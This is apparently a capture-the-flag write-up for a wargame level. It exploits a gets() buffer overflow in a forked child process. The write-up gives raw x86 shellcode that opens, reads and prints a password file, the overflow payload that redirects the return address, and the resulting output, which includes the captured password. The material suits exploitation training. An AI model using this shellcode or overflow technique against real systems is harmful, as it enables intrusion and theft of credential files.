here the program is fork in two process
the child process will read stdin into a buffer
but using gets() is unsafe because buffer bound aren't checked
which lead to a buffer overflow we could use to change the return address

we'll use a shellcode in environment variable for this level

the parent process is waiting for a signal from child process
if the child process use the syscall 11 [execve] the parent process
will kill it

So we need a shellcode that can open the file, read its contents and write the result to stdout

pseudo-code:
	shellcode:
		open file "/home/users/level05/.pass"
	_loop:
		read Byte from file
		if Byte != 0
			write Byte to stdout
			goto _loop
		exit

level04@OverRide:~$> export SHELLCODE=`python -c 'print "\x90" * 100000 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass\x00"'`

level04@OverRide:~$> python -c 'print "A"*156 + "\x00\x00\xff\xff"' | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
